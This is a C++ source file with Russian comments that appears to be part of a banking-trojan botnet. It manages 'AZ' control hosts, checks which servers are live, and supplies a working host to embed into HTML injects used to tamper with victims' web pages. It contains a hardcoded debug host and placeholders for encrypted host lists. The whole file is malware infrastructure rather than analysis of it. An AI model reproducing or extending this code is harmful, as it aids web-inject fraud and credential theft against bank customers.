//---------------------------------------------------------------------------
#pragma hdrstop



#include "Modules.h"


#ifdef AzConfigH
	//****************************************
	//   Файл включен в модули проекта
	//   используем отдельные настройки
	//****************************************
	#define USE_AZ_CONFIG
#else

    #include "AzConfig.h"

#endif


#include "Strings.h"
#include "Config.h"
#include "Utils.h"
#include "BotHosts.h"
//-----------------------------------------------------------------------------


// Внутренние данные модуля
namespace AZDATA
{
	DWORD PID = 0; // Идентификаор процесса в котором работает модуль
    THostChecker *Checker = NULL; // Система проверки работоспособности хостов
}



#ifdef USE_AZ_CONFIG

	char AZ_HOSTS[AZ_HOSTS_SIZE] = "__AZ_HOSTS__\0\0";

	#define AZ_HOSTS_HASH 0xE0203A42 /* __AZ_HOSTS__ */

#endif


//*****************************************************************
//  Хосты, которые будут вшиваться в HTML инжекты
//*****************************************************************
#ifdef DEBUGCONFIG
    // Отладочные данные
	char AZ_SCRIPTS_HOSTS[] = "rus.gipa.in\0\0";
#else
	// Рабочий массив
	char AZ_SCRIPTS_HOSTS[AZ_SCRIPTS_HOSTS_SIZE] = "__AZ_SCRIPTS_HOSTS__\0\0";
#endif

#define AZ_SCRIPTS_HOSTS_HASH 0x94D84D31 /* __AZ_SCRIPTS_HOSTS__ */



//----------------------------------------------------
// GetAzHost - Функция возвращает первый рабочий хост
// из массива хостов системы AZ
//----------------------------------------------------
string GetAzHost()
{
	#ifdef USE_AZ_CONFIG
		return GetActiveHostFromBuf2(AZ_HOSTS, AZ_HOSTS_HASH, true);
	#else
    	return GetActiveHost2();
	#endif
}
//-----------------------------------------------------------------------------


//----------------------------------------------------
//  GetAzURL - Функция возвращает полный адрес на
//   основе Хоста системы и переданного пути
//----------------------------------------------------
string GetAzURL(const char*  Path)
{
	string Host = GetAzHost();
	if (Host.IsEmpty()) return Host;
	TURL URL;
	URL.Host = Host;
	URL.Path = Path;

    return URL.URL();
}
//-----------------------------------------------------------------------------

//----------------------------------------------------
//  AzInicializeHostChecker - Функция инициализирует
//  систему проверки хостов
//----------------------------------------------------
void AzInicializeHostChecker()
{
	if (IsNewProcess(AZDATA::PID))
	{
		// Запуск в новом процессе
		#ifdef DEBUGCONFIG
        	bool Encrypted = false;
		#else
        	bool Encrypted = true;
		#endif
		AZDATA::Checker = new THostChecker(AZ_SCRIPTS_HOSTS, Encrypted);
    }
}
//-----------------------------------------------------------------------------


//----------------------------------------------------
//  AzInizializeHTMLInjects  - Функция инициализирует
//  систему подмены ссылок в HTML инжектах
//----------------------------------------------------
void AzInizializeHTMLInjects(const THTMLInjectList &Injects)
{
	// перебираем инжекты и ищем в них вхождение параметра

	int Count = Injects.Count();
	for (int i = 0; i < Count; i++)
	{
        THTMLInject *Inject = Injects[i];
	}
}
//-----------------------------------------------------------------------------



//----------------------------------------------------
// AzCheckScriptHosts - Функция запускает проверку
// хостов вшиваемых в HTML инжекты
//----------------------------------------------------
void AzCheckScriptHosts()
{
	// Инициализируем проверку
	AzInicializeHostChecker();

    AZDATA::Checker->Check();
}
//-----------------------------------------------------------------------------


//----------------------------------------------------
// AzGetScriptHost - Функция возвращает  рабочий хост
// для вшития в HTML инжекты
//----------------------------------------------------
string AzGetScriptHost()
{
	if (AnsiStr::Hash(AZ_SCRIPTS_HOSTS) == AZ_SCRIPTS_HOSTS_HASH)
		return NULLSTR;

	// Инициализируем чекер хостов
	AzInicializeHostChecker();

	// Запрашиваем рабочий хост
	return AZDATA::Checker->GetWorkHost();

}
//-----------------------------------------------------------------------------
